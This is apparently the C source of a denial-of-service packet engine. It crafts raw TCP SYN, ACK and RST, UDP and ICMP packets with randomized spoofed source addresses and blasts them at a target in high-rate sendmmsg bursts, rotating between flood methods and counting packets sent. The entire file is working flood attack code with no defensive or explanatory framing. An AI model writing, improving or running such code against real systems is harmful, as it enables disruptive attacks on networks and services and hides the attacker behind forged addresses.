#include "../include/engine.h"
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netinet/ip_icmp.h>

#define ADV_BURST 1024

static int g_advanced_sock = -1;
static int g_current_method = 0;
static uint64_t g_packets_sent = 0;
static uint64_t g_packets_dropped = 0;
static __thread unsigned int g_rand_state = 0;
static char g_adv_err[256] = {0};

static __thread struct {
    unsigned char hdr[sizeof(struct iphdr) + sizeof(struct tcphdr) + 12];
    int hdr_len;
    uint16_t src_port_off, seq_off, ip_id_off, saddr_off;
} adv_tmpl;
static __thread int adv_tmpl_valid = 0;

static int adv_xrand(void) {
    if (g_rand_state == 0) g_rand_state = (unsigned int)(time(NULL) ^ (uintptr_t)&g_rand_state);
    g_rand_state = g_rand_state * 1103515245U + 12345U;
    return (int)(g_rand_state & 0x7FFFFFFF);
}

static void build_adv_template(uint32_t dst_ip, uint16_t dst_port) {
    struct iphdr *ip = (struct iphdr *)adv_tmpl.hdr;
    struct tcphdr *tcp = (struct tcphdr *)(adv_tmpl.hdr + sizeof(struct iphdr));
    adv_tmpl.hdr_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    memset(adv_tmpl.hdr, 0, adv_tmpl.hdr_len);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(adv_tmpl.hdr_len);
    ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_TCP;
    ip->daddr = dst_ip;
    tcp->dest = htons(dst_port);
    tcp->doff = 5; tcp->window = htons(65535);
    adv_tmpl.src_port_off = sizeof(struct iphdr) + 0;
    adv_tmpl.seq_off = sizeof(struct iphdr) + 4;
    adv_tmpl.ip_id_off = 4;
    adv_tmpl.saddr_off = 12;
    adv_tmpl_valid = 1;
}

static inline void patch_adv_tcp(unsigned char *buf, uint32_t src, int syn, int ack, int rst, uint32_t ack_seq) {
    memcpy(buf, adv_tmpl.hdr, adv_tmpl.hdr_len);
    *(uint16_t*)(buf + adv_tmpl.src_port_off) = htons((uint16_t)(1024 + (adv_xrand() % 64511)));
    *(uint32_t*)(buf + adv_tmpl.seq_off) = (uint32_t)adv_xrand();
    *(uint16_t*)(buf + adv_tmpl.ip_id_off) = htons((uint16_t)(adv_xrand() & 0xFFFF));
    *(uint32_t*)(buf + adv_tmpl.saddr_off) = src;
    struct tcphdr *tcp = (struct tcphdr *)(buf + sizeof(struct iphdr));
    tcp->syn = syn ? 1 : 0; tcp->ack = ack ? 1 : 0; tcp->rst = rst ? 1 : 0;
    if (ack) tcp->ack_seq = ack_seq;
    struct iphdr *ip = (struct iphdr *)buf;
    uint32_t ck = 0; uint16_t *w = (uint16_t *)ip;
    for (int i = 0; i < 10; i++) ck += w[i];
    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
    ip->check = (uint16_t)~ck;
    uint32_t saddr = src, daddr = ip->daddr;
    uint16_t tcp_len = adv_tmpl.hdr_len - 20;
    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
                      (daddr >> 16) + (daddr & 0xFFFF) +
                      IPPROTO_TCP + htons(tcp_len);
    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
    uint32_t csum = pseudo;
    uint16_t *tw = (uint16_t *)tcp;
    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    tcp->check = (uint16_t)~csum;
}

static void build_adv_udp(unsigned char *buf, int *plen, struct sockaddr_in *dst, uint32_t spoof) {
    int size = 512 + (adv_xrand() % 1024);
    *plen = sizeof(struct iphdr) + sizeof(struct udphdr) + size;
    struct iphdr *ip = (struct iphdr *)buf;
    struct udphdr *udp = (struct udphdr *)(buf + sizeof(struct iphdr));
    memset(buf, 0, *plen);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(*plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->frag_off = htons(0x4000);
    ip->ttl = 64; ip->protocol = IPPROTO_UDP;
    ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = (~s) & 0xFFFF; }
    udp->source = htons((uint16_t)(1024 + (adv_xrand() % 64511)));
    udp->dest = dst->sin_port;
    udp->len = htons(sizeof(struct udphdr) + size);
}

static void build_adv_icmp(unsigned char *buf, int *plen, struct sockaddr_in *dst, uint32_t spoof) {
    *plen = sizeof(struct iphdr) + sizeof(struct icmphdr) + 56;
    struct iphdr *ip = (struct iphdr *)buf;
    struct icmphdr *icmp = (struct icmphdr *)(buf + sizeof(struct iphdr));
    memset(buf, 0, *plen);
    ip->ihl = 5; ip->version = 4; ip->tot_len = htons(*plen);
    ip->id = htons(adv_xrand() & 0xFFFF); ip->ttl = 64;
    ip->protocol = IPPROTO_ICMP; ip->saddr = spoof; ip->daddr = dst->sin_addr.s_addr;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)ip; for (int i = 0; i < 10; i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16); ip->check = (~s) & 0xFFFF; }
    icmp->type = ICMP_ECHO; icmp->code = 0;
    { uint32_t s = 0; uint16_t *p = (uint16_t *)icmp;
      for (int i = 0; i < (int)((sizeof(struct icmphdr) + 56) / 2); i++) s += p[i];
      while (s >> 16) s = (s & 0xFFFF) + (s >> 16); icmp->checksum = (~s) & 0xFFFF; }
}

EXPORT int init_advanced_engine(int sock, int method) {
    g_advanced_sock = sock;
    g_current_method = method;
    g_packets_sent = 0;
    g_packets_dropped = 0;
    if (g_rand_state == 0) g_rand_state = (unsigned int)(time(NULL) ^ (uintptr_t)&g_advanced_sock);
    if (g_advanced_sock < 0) {
        snprintf(g_adv_err, sizeof(g_adv_err), "invalid socket");
        return -1;
    }
    return 0;
}

EXPORT int advanced_send_batch(int sock, struct sockaddr_in *dst, int count, int method) {
    if (!dst || count <= 0 || sock < 0) return -1;
    if (g_advanced_sock != sock) g_advanced_sock = sock;

    struct mmsghdr msgs[ADV_BURST];
    struct iovec iovecs[ADV_BURST];
    unsigned char bufs[ADV_BURST][128];

    if (!adv_tmpl_valid)
        build_adv_template(dst->sin_addr.s_addr, ntohs(dst->sin_port));

    int batch = 0;
    while (batch < count && batch < ADV_BURST) {
        int len;
        uint32_t spoof = (uint32_t)(adv_xrand() | ((uint32_t)adv_xrand() << 16));
        switch (method) {
        case METHOD_SYN:
            patch_adv_tcp(bufs[batch], spoof, 1, 0, 0, 0);
            len = adv_tmpl.hdr_len; break;
        case METHOD_ACK:
            patch_adv_tcp(bufs[batch], spoof, 0, 1, 0, adv_xrand());
            len = adv_tmpl.hdr_len; break;
        case METHOD_RST:
            patch_adv_tcp(bufs[batch], spoof, 0, 0, 1, 0);
            len = adv_tmpl.hdr_len; break;
        case METHOD_ICMP:
            build_adv_icmp(bufs[batch], &len, dst, spoof); break;
        default:
            build_adv_udp(bufs[batch], &len, dst, spoof); break;
        }
        iovecs[batch].iov_base = bufs[batch];
        iovecs[batch].iov_len = len;
        msgs[batch].msg_hdr.msg_name = dst;
        msgs[batch].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
        msgs[batch].msg_hdr.msg_iovlen = 1;
        batch++;
    }

    int remaining = batch;
    int off = 0;
    while (remaining > 0) {
        int ret = sendmmsg(sock, msgs + off, remaining, MSG_DONTWAIT);
        if (ret > 0) {
            __sync_fetch_and_add(&g_packets_sent, ret);
            off += ret;
            remaining -= ret;
        } else {
            if (errno == EAGAIN || errno == EWOULDBLOCK)
                continue;
            __sync_fetch_and_add(&g_packets_dropped, remaining);
            break;
        }
    }
    return batch - remaining;
}

EXPORT int strategy_rotate(void) {
    static int rot = 0;
    rot++;
    g_current_method = (rot % 5);
    return g_current_method;
}

EXPORT void get_engine_stats(uint64_t *sent, uint64_t *dropped) {
    if (sent) *sent = __sync_add_and_fetch(&g_packets_sent, 0);
    if (dropped) *dropped = __sync_add_and_fetch(&g_packets_dropped, 0);
}
